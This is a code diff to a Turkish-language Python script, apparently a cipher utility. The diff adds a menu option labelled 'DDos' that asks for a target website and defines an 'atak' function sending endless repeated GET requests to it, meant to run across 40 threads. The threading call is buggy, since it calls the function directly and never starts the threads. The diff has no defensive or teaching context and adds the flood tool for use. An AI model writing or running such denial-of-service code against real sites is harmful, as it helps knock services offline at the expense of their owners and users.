@@ -5,6 +5,7 @@ import pyperclip
 import requests
 from tqdm import tqdm
 import sys, time, random
+import threading
  
 colorama.init()
 
@@ -36,12 +37,17 @@ if response_version != veri.splitlines():
     print_slow(Fore.CYAN + '\nSistem Yeniden Başlatılıyor...\n')
     os.system('cls')
     os.system('python alfabe.py')
+
+
+
     
     # Güncelleme tamamlandı, bayrağı ayarlayın
     update_done = True
 
 if not update_done:
-    # Sadece güncelleme yapılmadıysa devam edin
+    choose = input('Lütfen İşleminizi Seçin\n1-DDos\n2-Alfabe: ')
+if choose == '2':
+    
     alfabe = {
         'a': '3K',
         'b': '1Mü',
@@ -147,3 +153,26 @@ if not update_done:
             exit()
         else:
             print("Geçersiz seçenek!")
+
+
+if choose == '1':
+    
+    site = input(Fore.LIGHTYELLOW_EX+'Hedef Siteyi Giriniz (Örnek: https://hedefsite.com: '+Fore.WHITE)
+    def atak():
+        try:
+            while True:
+
+                requests.get(site)
+                requests.get(site)
+                requests.get(site)
+                requests.get(site)
+                requests.get(site)
+                requests.get(site)
+                requests.get(site)
+                
+                print(Fore.GREEN+'200')
+        except:
+            print(Fore.RED+'Bir Hata oluştu'+Fore.WHITE)
+
+    for i in range(40):
+        threading.Thread(target=atak())
